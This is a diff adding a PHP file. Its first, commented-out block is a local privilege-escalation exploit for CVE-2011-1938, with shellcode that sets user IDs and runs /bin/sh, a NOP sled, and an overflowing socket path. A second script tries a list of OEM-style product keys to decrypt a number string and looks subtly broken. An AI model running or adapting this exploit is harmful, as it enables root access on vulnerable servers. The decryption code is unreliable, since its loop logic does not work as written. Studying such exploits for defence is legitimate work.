@@ -1,0 +1,90 @@
+<?php/*
+echo "[+] CVE-2011-1938";
+echo "[+] there we go...\n";
+define('EVIL_SPACE_ADDR', "\xff\xff\xee\xb3");
+define('EVIL_SPACE_SIZE', 1024*1024*8);
+$SHELLCODE = 
+        "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0".
+        "\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1".
+        "\xcd\x80";
+echo "[+] creating the sled.\n";
+
+$CODE = str_repeat("\x90", EVIL_SPACE_SIZE);
+for ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ;
+        $i < strlen($SHELLCODE) ; $i++, $j++) {
+$CODE[$j] = $SHELLCODE[$i];
+}
+
+$b = str_repeat("A", 196).EVIL_SPACE_ADDR;
+$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);
+echo "[+] popping shell, have fun (if you picked the right address...)\n";
+$var85 = socket_connect($var79,$b);
+*/
+?>
+
+    <?php
+	set_time_limit(10000000);
+	error_reporting(0);
+      //------------------------------------------------------------------------------------
+      function evalCrossTotal($strMD5)
+      {
+          $intTotal = 0;
+          $arrMD5Chars = str_split($strMD5, 1);
+          foreach ($arrMD5Chars as $value)
+          {
+              $intTotal += '0x0'.$value;
+          }
+          return $intTotal;
+      }//-----------------------------------------------------------------------------------
+
+
+
+      //------------------------------------------------------------------------------------
+      function encryptString($strString, $strPassword)
+      {
+          // $strString is the content of the entire file with serials
+          $strPasswordMD5 = md5($strPassword);
+          $intMD5Total = evalCrossTotal($strPasswordMD5);
+          $arrEncryptedValues = array();
+          $intStrlen = explode(" ", $strString);
+          echo "sizeof: ".sizeof($intStrlen);
+          for ($i=0; $i<$intStrlen; $i++)
+          {
+              $arrEncryptedValues[] =  ord($intStrlen[$i])
+                                       -  ('0x0' . substr($strPasswordMD5, $i%32, 1))
+                                       +  $intMD5Total;
+              $intMD5Total = evalCrossTotal(substr(md5($strString[$i+1]), 0, 16)
+                                       .  substr(md5($intMD5Total), 0, 16));
+          }
+         $to_print =  implode(' ' , $arrEncryptedValues);
+         print_r($arrEncryptedValues);
+         return $to_print;
+      }//-----------------------------------------------------------------------------------
+
+      $str = '-183 -156 -143 -197 -153 -178 -105 -168 -129 -163 -213 -217 -151 -110 -113 -238 -193 -163 -173 -247 -138 -132 -174 -162 -171 -188 -131 -189 -179 -135 -127 -211 -94 -206 -154 -130 -194 -201 -164 -262 -153 -128 -162 -162 -121 -116 -174 -229 -121 -165 -150 -175 -167 -132 -123 -154 -187 -203 -169 -175 -218 -135 -128 -193 -152 -179 -160 -211 -139 -155 -113 -165 -152 -134 -147 -166 -215 -168 -195 -203 -175 -127 -170 -186 -176 -166 -147 -174 -125 -132 -153 -194 -157 -158 -189 -170 -151 -166 -152 -225'; 
+$keys = array('99Z-KH5-OEM-240-1.1\n',
+'QGG-V33-OEM-0B1-1.1\n',
+'Z93-Z29-OEM-BNX-1.1\n',
+'IQ0-PZI-OEM-PK0-1.1\n',
+'UM4-VDL-OEM-B9O-1.1\n',
+'L0S-4R2-OEM-UQL-1.1\n',
+'JBL-EYQ-OEM-ABB-1.1\n',
+'NL1-3V3-OEM-L4C-1.1\n',
+'7CQ-1ZR-OEM-U3I-1.1\n',
+'XX0-IHL-OEM-5XK-1.1\n',
+'KJQ-RXG-OEM-TW8-1.1\n',
+'OZR-LW1-OEM-5EM-1.1\n',
+'0B8-6K5-OEM-EFN-1.1\n',
+'OE2-20L-OEM-SSI-1.1\n',
+'0ME-HAE-OEM-9XB-1.1\n'
+);
+
+foreach ($keys as $key){
+	echo $key."\n";
+	echo encryptString($str, $key);
+}   
+   
+   
+   
+
+?>
